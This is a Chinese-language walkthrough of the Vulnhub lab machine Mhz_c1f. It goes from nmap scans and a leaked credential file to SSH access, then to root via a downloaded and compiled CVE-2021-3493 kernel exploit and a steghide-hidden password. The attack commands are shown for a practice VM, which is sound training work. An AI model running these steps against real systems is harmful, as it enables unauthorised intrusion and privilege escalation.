## 靶机描述

_这是一台标榜难度为简单的开源靶机，作者在描述中直言这台靶机难度简直小菜一碟。笔者在实践过程中，并没有采取预期解，而是采用另一种方式提权 root。_

![des](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101165130211.png)


## 信息收集


1. 端口扫描

我们先使用 nmap 的 -sT 参数扫描目标靶机开放的端口。可见，目标开放 22，80 端口。根据渗透测试优先级，80 端口可能存在的攻击面比 22 端口多。因此我们优先渗透 80 端口。

```
# Nmap 7.99 scan initiated Sat Oct 31 20:30:14 2026 as: /usr/lib/nmap/nmap --min-rate 10000 -p- -oA nmapscan/TCPS 192.168.1.17
Nmap scan report for 192.168.1.17
Host is up (0.000079s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 00:0C:29:AB:40:1D (VMware)

# Nmap done at Sat Oct 31 20:30:16 2026 -- 1 IP address (1 host up) scanned in 1.85 seconds
```

2. 详细信息扫描

目标 80 端口运行这 Apache 服务器。结果显示并没有过低版本的服务可以作为突破口。

```
# Nmap 7.99 scan initiated Sat Oct 31 20:31:20 2026 as: /usr/lib/nmap/nmap -sT -sV -sC -O -p22,80 -oA nmapscan/details 192.168.1.17
Nmap scan report for 192.168.1.17
Host is up (0.00041s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 38:d9:3f:98:15:9a:cc:3e:7a:44:8d:f9:4d:78:fe:2c (RSA)
|   256 89:4e:38:77:78:a4:c3:6d:dc:39:c4:00:f8:a5:67:ed (ECDSA)
|_  256 7c:15:b9:18:fc:5c:75:aa:30:96:15:46:08:a9:83:fb (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
MAC Address: 00:0C:29:AB:40:1D (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 31 20:31:28 2026 -- 1 IP address (1 host up) scanned in 8.34 seconds
```

3. 漏洞脚本扫描

漏洞脚本扫描的结果也没有显示哪些可以直接利用的攻击面。

```
# Nmap 7.99 scan initiated Sat Oct 31 20:32:17 2026 as: /usr/lib/nmap/nmap --script=vuln -p22,80 -oA nmapscan/vulns 192.168.1.17
Nmap scan report for 192.168.1.17
Host is up (0.00056s latency).

PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
MAC Address: 00:0C:29:AB:40:1D (VMware)

# Nmap done at Sat Oct 31 20:32:49 2026 -- 1 IP address (1 host up) scanned in 32.14 seconds
```


## WEB 渗透

前端界面是 Apache 的默认界面。我们使用 Gobuster 工具进行目录路径枚举。

![p1](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101170501591.png)

### 页面敏感文件泄露

通过目录枚举的结果，我们发现 Apache 公开了一个 notes.txt 文件，这很有价值。里面写了一些作者的提示。

![p2](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101170653643.png)

其中 remb.txt 文件可以在服务器上被找到。

![p3](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101170739075.png)

这里给了我们一个很有价值的凭据。

```text
first_stage:flagitifyoucan1234
```


## ssh 获得立足点

使用我们获得的凭据，登录 ssh 服务器。

![p4](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101171027495.png)

经过一些查找，我们发现了在家目录下面的 user.txt 文件。

![p5](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101171144308.png)

这个文件提示我们去寻找更高的权限。

### 内核提权

我们使用以下命令，我们发现目标系统是一个 版本为 18.04 的 Ubuntu。

```shell
cat /proc/version
cat /etc/os-release
```

![kernels](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101172236845.png)


我们将 linux-exploit-suggester.sh 下载到立足点处。但是立足点处没有 gcc 这个工具。我们没法在立足点处编译文件。如果在 kali 上编译，可能会因为内核的原因，导致程序在立足点处运行产生崩溃。

![p6](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101171833278.png)

为了简便操作，我们在 kali 上安装 docker

```shell
sudo apt install docker.io
```

安装成功后，我们拉取一个 Ubuntu 18.04 的镜像。

![p7](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101172626964.png)

```shell
sudo docker image list
sudo docker run -it ubuntu:18.04 /bin/bash
sudo docker cp ./exploit.c 334f9e2ff807:/tmp
```

使用 cp 命令将 exploit.c 这个文件复制到容器镜像内。

```shell
#在 docker里面
sudo apt install gcc 
wget https://raw.githubusercontent.com/briskets/CVE-2021-3493/refs/heads/main/exploit.c
gcc exploit.c -o exploit1

#在kali 上
sudo docker cp 334f9e2ff807:/tmp/exploit1 ./
```

然后开启网络服务器,我们在立足点下载 exploit 后，给予权限运行，成功获得 root 权限。

![p8](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101173345571.png)



### 图片隐写

![p9](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101174109323.png)

在权限枚举过程中，发现 mhz_c1f 用户目录下，有许多图片。这台靶机很有 CTF 风格，那么这些图片中，很有可能会藏在一些密码文件。

![p10](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101173924893.png)

我们使用 steghide 工具发现了藏在图片中的 remb2.txt 文件。

![p11](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101174512688.png)

经过尝试，这个密码可以在终端中，通过这条命令切换用户。

```
su - mhz_c1f
```

![p12](../vulnhubScreenShot/(纯)Vulnhub%20Mhz_c1f%20靶机渗透总结/IMG-20261101174756902.png)

最终成功获得了 root 权限。

## 总结

这一台非常简单的 CTF 风格的靶机，通过信息收集，我们发现目标开放了 22， 80 端口。根据渗透的优先级来看，我们应该优先渗透 80 端口。通过目录枚举泄露的 notes.txt 文件，我们成功获得了ssh 立足点。通过查看 /home 文件夹下的 mhz_c1f 家目录，我们发现一些不寻常的图片，通过使用 steghide 工具，我们成功发现了隐藏的 remb2.txt 文件。我们拿到了 mhz_c1f 的立足点，通过 sudo -l 枚举，我们发现了当前用户可以直接提升为 root 用户，最终成功提权。